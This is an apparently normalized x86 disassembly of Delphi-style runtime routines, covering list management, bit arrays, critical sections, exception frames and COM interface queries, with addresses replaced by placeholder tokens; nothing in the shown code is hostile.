mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_4243d1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_4243b2
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax edx
push ebp
call sub_424298
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4241b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243b9
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_42420c
retn
call sub_42423c
sub_4243e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_424445
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42b3e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42444c
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_424454
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov edx [ ebx ]
mov eax edx
mov ecx [ esi ]
mov edx ecx
cmp edx eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_4254d8
push eax
mov eax esi
call sub_4254d8
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424559
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4243e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42453c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4243e8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_434e78
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424543
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
mov al 0x1
sub_424570
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_424590
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4245dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4476cc
mov eax [ ebx + 0x4 ]
mov edi [ eax + esi * 4 ]
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_42463c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_424638
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
jmp sub_448c38
sub_424674
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4246bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44be28
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_42463c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246c3
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4246e8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_424710
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_424934
retn
sub_424744
push esi
mov ecx [ eax + 0x8 ]
mov esi [ eax + 0x4 ]
mov eax ecx
dec eax
test eax eax
jl r-xdata
or ecx 0xffffffff
inc eax
xor ecx ecx
mov eax ecx
pop esi
retn
inc ecx
dec eax
jne r-xdata
cmp edx [ esi + ecx * 4 ]
je r-xdata
sub_424768
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4476cc
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4247f8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4246e8
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4245dc
xor ecx ecx
mov edx esi
mov eax ebx
call sub_424768
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_424850
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4248a0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_424744
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4245dc
sub_4248c0
push ebx
push esi
push edi
push ebp
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebp ebp
xor ebx ebx
jmp r-xdata
cmp ebx [ esi + 0x8 ]
jge r-xdata
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + ebx * 4 ] 0x0
je r-xdata
cmp ebx [ esi + 0x8 ]
jl r-xdata
mov edi ebx
jmp r-xdata
inc ebx
mov [ esi + 0x8 ] ebp
cmp edi [ esi + 0x8 ]
jge r-xdata
dec edi
cmp ebp ebx
jge r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + edi * 4 ] 0x0
jne r-xdata
mov eax edi
sub eax ebx
inc eax
add ebp eax
lea ebx [ edi + 0x1 ]
mov eax [ esi + 0x4 ]
lea edx [ eax + ebp * 4 ]
mov eax edi
sub eax ebx
inc eax
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ esi + 0x4 ]
lea eax [ eax + ebx * 4 ]
call sub_4476cc
inc edi
sub_424934
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
lea eax [ ebx + 0x4 ]
call sub_4474c0
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_424970
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_424674
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_424934
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
add eax eax
add eax eax
xor ecx ecx
xchg edx eax
call sub_447ae4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4245dc
dec ebp
inc edi
jne r-xdata
sub_4249e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_424a3c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44873c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424b88
xor eax eax
push ebp
push sub_424a9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4481b0
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4481a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424aa6
mov eax [ ebp - 0x4 ]
call sub_424bec
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_424ab8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424b88
xor eax eax
push ebp
push sub_424b34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_424590
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_424744
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b3b
mov eax [ ebp - 0x4 ]
call sub_424bec
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_424674
sub_424b40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424b88
xor eax eax
push ebp
push sub_424b7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b85
mov eax [ ebp - 0x4 ]
call sub_424bec
retn
sub_424b9c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424b88
xor eax eax
push ebp
push sub_424bdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4248a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424be6
mov eax [ ebp - 0x4 ]
call sub_424bec
retn
sub_424bf8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_424c4c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_424c4c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_424c28
sar eax 0x5
mov edi eax
add edi edi
add edi edi
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
add ebp ebp
add ebp ebp
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_44748c
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_447ae4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4474a8
mov edx edi
mov eax ebp
call sub_424c40
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4476cc
sub_424cf0
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_424c28
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_424c4c
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_424d1c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_424d94
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_4283f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_424dd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_424e6c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_448088
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
lea edx [ ebp - 0x18 ]
mov eax [ ebx ]
call sub_448088
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e73
lea eax [ ebp - 0x18 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_424e9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_424f17
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx ]
call sub_448088
mov eax ebx
mov si 0xffff
call sub_4483f8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f1e
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
mov si 0xffff
call sub_4483f8
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_4483f8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_44a1b8
sub_424f2b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_448464
mov eax ebx
mov si 0xffff
call sub_4483f8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4483f8
push eax
lea eax [ ebx + 0x4 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
pop eax
call sub_448278
sub_424f76
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_424fa8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_424fc8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_448278
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_424ff0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b8d8
test edi edi
je r-xdata
xor edx edx
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax edi
mov si 0xffff
call sub_4483f8
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b8d8
mov edx eax
mov eax ebx
call sub_424ff0
test [ edi + 0x1c ] 0x10
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b8d8
push eax
push r-xdata
push edi
mov eax [ edi ]
call [ eax + 0x28 ]
jmp r-xdata
sub_425090
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4250e5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_44b8d8
mov edx eax
mov eax edi
call sub_424ff0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250ec
lea eax [ ebp - 0x4 ]
call sub_44b8d8
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4250f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_42512c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_42515c
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4251ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42522d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx ]
call sub_448088
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_4483f8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
mov eax ebx
call sub_425180
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_436540
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425234
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
sub_425243
inc [ esi ]
add [ eax ] al
add [ 0x5b007300 ] ah
add [ 0x5d006400 ] ah
add [ eax ] al
add [ eax ] al
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_425780
mov edx ebx
mov eax esi
call sub_425718
sub_42528c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_425180
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4247f8
mov dl 0x1
mov eax ebx
call sub_42515c
sub_4252bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_425090
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_425308
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_425090
mov eax [ esi + 0x8 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
mov eax esi
call sub_425430
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_425354
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_425374
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_424dc0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_425403
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
mov edi [ ebx + 0x8 ]
test edi edi
jg r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 4 - 0x4 ]
call sub_4481b0
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov edx edi
call sub_4246e8
push eax
mov eax [ ebp - 0x4 ]
call sub_425354
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_425430
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_42548c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
mov esi [ ebx + 0x8 ]
test esi esi
jg r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 - 0x4 ]
call sub_4481b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4254b8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4254e0
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_4254f4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_425587
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx ]
call sub_448088
mov eax ebx
mov si 0xffff
call sub_4483f8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42558e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov eax ebx
mov si 0xffff
